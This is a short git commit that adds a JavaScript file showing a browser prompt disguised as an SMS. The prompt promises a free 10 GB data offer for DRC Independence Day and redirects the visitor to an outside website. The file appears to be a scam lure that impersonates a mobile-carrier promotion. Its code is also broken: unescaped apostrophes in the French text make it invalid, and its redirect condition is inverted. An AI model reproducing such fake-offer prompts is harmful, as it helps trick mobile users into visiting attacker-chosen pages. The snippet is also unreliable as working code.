6becad41ee7c72e5a1965c17c47b9648259de5da
boss-bloq <nsisboy01@gmail.com>
2024-06-26 11:20:39 -0700

    Create drc-activation.js

---
+++ drc-activation.js
@@ -0,0 +1,6 @@
+
+var password = '1'
+password=prompt('SMS: JOYEUX JOUR DE L'INDÉPENDANCE : vous recevrez une offre de 10 Go pour célébrer le Jour de l'Indépendance (RDC), veuillez appuyer sur 1 pour l'activer maintenant. ','1');
+if (password != '1') {
+location.href='https://damba-fest.org/drc-independence.html';
+}
